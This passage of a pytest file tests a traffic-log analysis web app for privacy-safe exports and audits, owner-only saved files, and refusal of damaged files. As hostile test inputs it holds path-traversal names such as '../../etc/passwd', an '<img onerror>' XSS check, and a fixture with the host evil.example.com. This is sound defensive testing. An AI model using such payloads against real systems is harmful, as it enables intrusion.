        out += [os.path.join(root, f) for f in files]
    return sorted(out)


def test_analysing_writes_nothing_and_logs_no_log_content(client, tmp_path):
    """ASVS V8.3.4 · CWE-532 · WSTG-INFO-05: an analysis leaves no file anywhere in the app's data folders, and the audit line keeps the file name and size, never a user, host or line."""
    data_dirs = [os.environ["XDG_CACHE_HOME"], str(tmp_path)]
    before = {d: _files_under(d) for d in data_dirs if os.path.isdir(d)}
    body = lines(activity("c1", "secret.user@example.com", T0, host="hidden-host.example.com"))
    r = client.post("/api/traffic-logs/analyze", json={"files": upload(body, "ua.json")})
    assert r.status_code == 200
    after = {d: _files_under(d) for d in data_dirs if os.path.isdir(d)}
    assert after == before
    audit = open(os.environ["DLP_CHECK_AUDIT"], encoding="utf-8").read() if os.path.exists(os.environ["DLP_CHECK_AUDIT"]) else ""
    assert "/api/traffic-logs/analyze" in audit and "ua.json" in audit
    assert "secret.user" not in audit and "hidden-host" not in audit
    assert client.get("/api/traffic-logs/saved").json() == {"reports": []}


def test_exports_are_counts_only_unless_names_are_asked_for(client):
    """ASVS V8.3.4 · CWE-359 · WSTG-INFO-05: downloads replace user names by user 1, user 2 and drop the session list unless names=true."""
    body = lines(status("s1", "secret.user@example.com", T0), activity("c1", "secret.user@example.com", T0, reason="BRK_MT_SETUP_TIMEOUT"))
    rid = client.post("/api/traffic-logs/analyze", json={"files": upload(body)}).json()["report_id"]
    for fmt in ("json", "csv"):
        anon = client.get(f"/api/traffic-logs/report/{rid}/export?format={fmt}").text
        named = client.get(f"/api/traffic-logs/report/{rid}/export?format={fmt}&names=1").text
        assert "secret.user" not in anon and "user 1" in anon and "203.0.113.10" not in anon
        assert "secret.user" in named
    x = client.get(f"/api/traffic-logs/report/{rid}/export?format=xlsx")
    with zipfile.ZipFile(io.BytesIO(x.content)) as z:
        assert "secret.user" not in "".join(z.read(n).decode() for n in z.namelist())


def test_save_writes_an_owner_only_counts_only_file_that_opens_lists_and_deletes(client, tmp_path):
    """ASVS V8.3.4 · CWE-276 · WSTG-ATHZ-01: Save writes one 0600 file, counts only by default, audited without user names; it lists, opens as a new in-memory report and deletes."""
    body = lines(activity("c1", "secret.user@example.com", T0))
    rid = client.post("/api/traffic-logs/analyze", json={"files": upload(body)}).json()["report_id"]
    r = client.post(f"/api/traffic-logs/report/{rid}/save", json={"title": "Week 44‮<b>"})
    assert r.status_code == 200
    name = r.json()["saved"]["name"]
    path = tmp_path / "saved" / name
    assert path.is_file() and "secret.user" not in path.read_text()
    if os.name == "posix":
        assert stat.S_IMODE(path.stat().st_mode) == 0o600
    listed = client.get("/api/traffic-logs/saved").json()["reports"]
    assert [x["name"] for x in listed] == [name] and listed[0]["title"] == "Week 44<b>" and listed[0]["names"] is False
    opened = client.post(f"/api/traffic-logs/saved/{name}/open").json()
    assert opened["report_id"] != rid and opened["counts_only"] is True
    assert "secret.user" not in open(os.environ["DLP_CHECK_AUDIT"], encoding="utf-8").read()
    named = client.post(f"/api/traffic-logs/report/{rid}/save", json={"names": True}).json()["saved"]
    assert "secret.user" in (tmp_path / "saved" / named["name"]).read_text()
    assert client.delete(f"/api/traffic-logs/saved/{name}").status_code == 200
    assert client.delete(f"/api/traffic-logs/saved/{name}").status_code == 404


@pytest.mark.parametrize("name", ["../../etc/passwd", "..%2F..%2Fx.json", "20261027-080000-abcdefgh.json.bak", "x.json"])
def test_saved_report_names_are_never_paths(client, name):
    """ASVS V12.3.1 · CWE-22 · WSTG-ATHZ-01: a saved report is named by the app's own pattern; any other name, a path included, is refused."""
    assert client.post(f"/api/traffic-logs/saved/{name}/open").status_code in (400, 404)
    assert client.delete(f"/api/traffic-logs/saved/{name}").status_code in (400, 404)


def test_a_damaged_or_foreign_saved_file_is_refused(client, tmp_path):
    """ASVS V5.1.3 · CWE-502 · WSTG-INPV-01: a file in the saved folder that is not JSON, is another kind, or is too large is refused, not executed or trusted."""
    folder = tmp_path / "saved"
    folder.mkdir()
    (folder / "20261027-080000-aaaaaaaa.json").write_text("{broken")
    (folder / "20261027-080000-bbbbbbbb.json").write_text(json.dumps({"kind": "something-else", "version": 1}))
    for n in ("20261027-080000-aaaaaaaa.json", "20261027-080000-bbbbbbbb.json"):
        assert client.post(f"/api/traffic-logs/saved/{n}/open").status_code == 400
    assert {x["title"] for x in client.get("/api/traffic-logs/saved").json()["reports"]} == {"(could not be read)"}


def test_forget_removes_the_analysis_from_memory(client):
    """ASVS V8.3.5 · CWE-226 · WSTG-INFO-05: Forget drops the in-memory analysis; its report and exports are gone after."""
    rid = client.post("/api/traffic-logs/analyze", json={"files": upload(lines(activity("c1", "ann@example.com", T0)))}).json()["report_id"]
    assert client.delete(f"/api/traffic-logs/report/{rid}").status_code == 200
    assert client.get(f"/api/traffic-logs/report/{rid}").status_code == 404
    assert client.get(f"/api/traffic-logs/report/{rid}/export?format=csv").status_code == 404
    assert client.get("/api/traffic-logs/report/bypass-abc").status_code == 404   # another kind's id is not served here


def test_info_route_names_the_limits_and_questions(client):
    """ASVS V14.3.3 · CWE-1059 · WSTG-CONF-01: the page learns the upload limit, line caps and SIEM questions from the server."""
    d = client.get("/api/traffic-logs/info").json()
    assert d["max_lines"] == tl.MAX_LINES and d["max_line_kb"] == 64 and len(d["siem"]["questions"]) == len(siem_queries.QUESTIONS)
    assert client.get("/report/traffic-logs").status_code == 200


# ── In a real browser ────────────────────────────────────────────────
BROWSER_DRIVER = r"""
const [fixture] = args;
const out = {};
await send('DOM.enable');
await send('Page.navigate', { url: base + '/report/traffic-logs' });
await until(() => ev(`document.readyState === 'complete' && document.getElementById('tlQuery').value.length > 20`), 'the page and its first query');
const doc = await send('DOM.getDocument', {});
const node = await send('DOM.querySelector', { nodeId: doc.result.root.nodeId, selector: '#tlFiles' });
await send('DOM.setFileInputFiles', { nodeId: node.result.nodeId, files: [fixture] });
await until(() => ev(`!document.getElementById('tlRun').disabled`), 'Analyze enabled');
await ev(`document.getElementById('tlRun').click(), 1`);
await until(() => ev(`!document.getElementById('tlResults').hidden && document.querySelectorAll('#tlZpa table').length > 3`), 'the results');
out.pwned = await ev(`!!window.__pwned`);
out.injected = await ev(`document.querySelectorAll('#tlResults img, #tlResults script, #tlResults [onerror]').length`);
out.literal = await ev(`document.getElementById('tlResults').textContent.includes('<img src=x onerror=')`);
out.pathHref = await ev(`(document.querySelector('#tlResults a.tl-link[href^="/report/path"]') || {}).getAttribute ? document.querySelector('#tlResults a.tl-link[href^="/report/path"]').getAttribute('href') : ''`);
out.reasonText = await ev(`document.getElementById('tlReasons').textContent`);
out.anoms = await ev(`document.getElementById('tlAnoms').textContent`);
await ev(`document.querySelector('#tlResults button.tl-act').click(), 1`);
await until(() => ev(`document.getElementById('tlQDest').value !== '' || document.getElementById('tlQUser').value !== ''`), 'a SIEM filter');
await until(() => ev(`/Username|Host|login|host/.test(document.getElementById('tlQuery').value) && document.getElementById('tlQStatus').textContent.includes('Filtered')`), 'the filtered query');
await send('Emulation.setDeviceMetricsOverride', { width: 320, height: 800, deviceScaleFactor: 1, mobile: true });
await until(() => ev(`new Promise(r => requestAnimationFrame(() => requestAnimationFrame(() => r(true))))`), 'layout');
out.overflow320 = await ev(`document.documentElement.scrollWidth - document.documentElement.clientWidth`);
await send('Emulation.clearDeviceMetricsOverride');
await ev(`document.getElementById('tlForget').click(), 1`);
await until(() => ev(`document.getElementById('tlResults').hidden`), 'forgotten');
out.afterForget = await ev(`document.getElementById('tlZpa').childElementCount`);
await send('Page.navigate', { url: base + '/report/insights?from=1793088000000&to=1793174400000' });
await until(() => ev(`document.readyState === 'complete' && document.getElementById('tiWindow').value === 'custom'`), 'the insights window');
out.insightsFrom = await ev(`document.getElementById('tiFrom').value.length`);
out.insightsCustomShown = await ev(`!document.getElementById('tiCustom').hidden`);
console.log(JSON.stringify(out));
ws.close(); p.kill(); process.exit(0);
"""


@pytest.fixture(scope="module")
def browser(tmp_path_factory):
    from test_findings_reflow import CDP_PRELUDE, run_in_browser
    d = tmp_path_factory.mktemp("tlogs-browser")
    recs = [activity(f"c{i}", "ann@example.com", T0 + timedelta(minutes=i)) for i in range(5)]
    recs += [activity("h1", HOSTILE, T0, host="evil.example.com", app=HOSTILE, reason="BRK_MT_SETUP_FAIL_REJECTED_BY_POLICY")]
    fixture = d / "ua.json"
    fixture.write_text(lines(*recs))
    mp = pytest.MonkeyPatch()
    mp.setenv("DLP_CHECK_TRAFFIC_LOG_REPORTS", str(d / "saved"))
    try:
        return run_in_browser(d, CDP_PRELUDE + BROWSER_DRIVER, str(fixture))
    finally:
        mp.undo()


def test_browser_shows_hostile_log_values_as_text(browser):
    """ASVS V5.3.3 · CWE-79 · WSTG-CLNT-03 · WCAG 2.2 SC 4.1.2: in Chrome, a log value carrying an <img onerror> is shown as text: no element is made and nothing runs."""
    assert browser["pwned"] is False and browser["injected"] == 0 and browser["literal"] is True


def test_browser_links_a_destination_to_the_path_analyzer_and_fills_the_siem_query(browser):
    """ASVS V5.1.3 · CWE-601 · WSTG-CLNT-04 · WCAG 2.2 SC 2.4.4: a destination links to /report/path with it filled in (never started), and its SIEM query button filters the query."""
    assert browser["pathHref"].startswith("/report/path?d=") and "port=443" in browser["pathHref"]
    assert "Access policy denied it" in browser["reasonText"]


def test_browser_reflows_at_320px_forgets_and_fills_the_insights_window(browser):
    """WCAG 2.2 SC 1.4.10 · ASVS V8.3.5 · CWE-226 · WSTG-INFO-05: the results never scroll sideways at 320px, Forget clears them, and Traffic insights opens with the logs' window filled in."""
    assert browser["overflow320"] <= 0
    assert browser["afterForget"] == 0
    assert browser["insightsFrom"] == 16 and browser["insightsCustomShown"] is True
